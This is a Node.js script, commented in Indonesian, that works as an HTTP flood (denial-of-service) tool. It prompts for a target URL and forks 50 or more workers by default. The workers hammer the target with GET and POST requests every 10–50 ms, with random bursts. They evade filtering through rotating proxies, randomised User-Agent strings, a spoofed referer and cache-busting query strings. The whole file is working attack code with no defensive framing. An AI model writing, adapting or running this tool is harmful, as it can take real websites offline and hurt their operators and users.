const axios = require('axios');
const { fork } = require('child_process');
const fs = require('fs');
const readline = require('readline');
const HttpsProxyAgent = require('https-proxy-agent');

// ===== User-Agent Lengkap dan Stabil =====
const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64)',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X)',
  'Mozilla/5.0 (Linux; Android 11; SM-G991B)',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
  'Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
  'Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 Chrome/89.0.4389.105',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/88.0.4324.96'
];

// ===== Method yang Diizinkan =====
const methods = ['GET', 'POST'];

// ===== Proxy Loader =====
let proxyList = [];
try {
  const raw = fs.readFileSync('./proxies.txt', 'utf-8');
  proxyList = raw.split(/\r?\n/).map(p => p.trim())
    .filter(p => p && !p.startsWith('#'))
    .map(p => p.startsWith('http') ? p : `http://${p}`);
  console.log(`📡 ${proxyList.length} proxy berhasil dimuat dari proxies.txt`);
} catch (err) {
  console.warn('⚠️ Gagal baca proxies.txt, akan lanjut tanpa proxy.');
}

// ===== Random Helper =====
function randomFrom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randomQuery() {
  return `?id=${Math.floor(Math.random() * 1000000)}&rand=${Math.random().toString(36).slice(2,8)}`;
}

// ===== Kirim Request =====
async function sendRequest(target) {
  const method = randomFrom(methods);
  const proxy = proxyList.length > 0 ? randomFrom(proxyList) : null;
  const userAgent = randomFrom(userAgents);

  const headers = {
    'User-Agent': userAgent,
    'Referer': 'https://google.com',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache'
  };

  const options = { headers, timeout: 5000 };

  if (proxy) {
    try {
      const agent = new HttpsProxyAgent(proxy);
      options.httpAgent = agent;
      options.httpsAgent = agent;
    } catch (err) {
      // Gagal bikin agent, lanjut tanpa proxy
    }
  }

  const url = target + randomQuery();

  try {
    if (method === 'POST') {
      await axios.post(url, {}, options);
    } else {
      await axios.get(url, options);
    }
    process.send && process.send(`✅ ${method} via ${proxy || 'no proxy'} - UA: ${userAgent}`);
  } catch (err) {
    process.send && process.send(`❌ ${method} via ${proxy || 'no proxy'} - ${err.code || err.message}`);
  }
}

// ===== Mode Worker =====
if (process.argv[2] === 'worker') {
  const target = process.argv[3];

  function loop() {
    // Burst mode: 20% chance kirim 10 request sekaligus
    const burst = Math.random() < 0.2;

    if (burst) {
      for (let i = 0; i < 10; i++) {
        sendRequest(target);
      }
    } else {
      sendRequest(target);
    }

    setTimeout(loop, burst ? 100 : Math.floor(Math.random() * 40) + 10); // delay 10-50 ms, 100 ms saat burst
  }

  loop();
  return;
}

// ===== CLI =====
const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

rl.question('🌐 Masukkan target URL: ', (answer) => {
  const target = answer.trim().startsWith('http') ? answer.trim() : `http://${answer.trim()}`;
  if (!target) {
    console.log('❌ Target tidak boleh kosong!');
    rl.close();
    process.exit(1);
  }

  rl.question('⚙️ Masukkan jumlah worker (default 50): ', (workersInput) => {
    let numWorkers = parseInt(workersInput);
    if (isNaN(numWorkers) || numWorkers <= 0) {
      numWorkers = 50;
    }

    rl.close();
    console.log(`🚀 Menyerang ${target} dengan ${numWorkers} worker...`);

    for (let i = 0; i < numWorkers; i++) {
      const worker = fork(__filename, ['worker', target]);
      worker.on('message', msg => console.log(`Worker ${i}: ${msg}`));
      worker.on('exit', code => console.log(`Worker ${i} keluar dengan kode ${code}`));
    }
  });
});
  
